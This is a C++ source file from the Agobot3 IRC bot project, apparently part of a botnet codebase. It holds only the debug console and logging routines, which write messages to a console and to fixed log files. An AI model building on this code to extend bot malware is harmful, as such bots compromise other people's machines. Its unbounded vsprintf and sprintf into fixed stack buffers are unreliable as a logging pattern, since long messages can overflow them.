/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "consdbg.h"

#define LOGBUF_SIZE 8192

void CConsDbg::Init(int iDebugLevel)
{
#ifdef WIN32
	if(g_pMainCtrl->m_cCmdLine.m_cConfig.bDebug)
	{	AllocConsole(); m_hStdOut=GetStdHandle(STD_OUTPUT_HANDLE); m_hStdErr=GetStdHandle(STD_ERROR_HANDLE); }
#endif
	m_bEnabled=true; m_iDebugLevel=iDebugLevel; }

void CConsDbg::DeInit()
{
#ifdef WIN32
	if(g_pMainCtrl->m_cCmdLine.m_cConfig.bDebug)
	{	FreeConsole(); m_hStdOut=INVALID_HANDLE_VALUE; m_hStdErr=INVALID_HANDLE_VALUE; }
#endif
	m_bEnabled=false; }

#ifdef DBGCONSOLE
void CConsDbg::Log(int iDebugLevel, const char *logfmt, ...)
{
	va_list va_alist; char logbuf[LOGBUF_SIZE]; char logbuf2[LOGBUF_SIZE];
	va_start(va_alist, logfmt); vsprintf(logbuf2, logfmt, va_alist); va_end(va_alist);
	sprintf(logbuf, "[%d/%d] %s", iDebugLevel, m_iDebugLevel, logbuf2);

#ifdef _WIN32
	FILE *fp=fopen("c:\\debug.log", "a");
#else
	FILE *fp=fopen("/tmp/debug.log", "a");
#endif // _WIN32
	if(fp) {
		fprintf(fp, "%s", logbuf);
		fclose(fp); }

#ifdef WIN32
	if(m_iDebugLevel>4) OutputDebugString(logbuf);
#endif // WIN32

	if(!m_bEnabled || m_iDebugLevel<iDebugLevel) return;
#ifdef WIN32
	DWORD dwWritten; WriteFile(m_hStdOut, logbuf, strlen(logbuf), &dwWritten, NULL);
#else
	fprintf(stdout, "%s", logbuf);
#endif
}

#endif // DBGCONSOLE
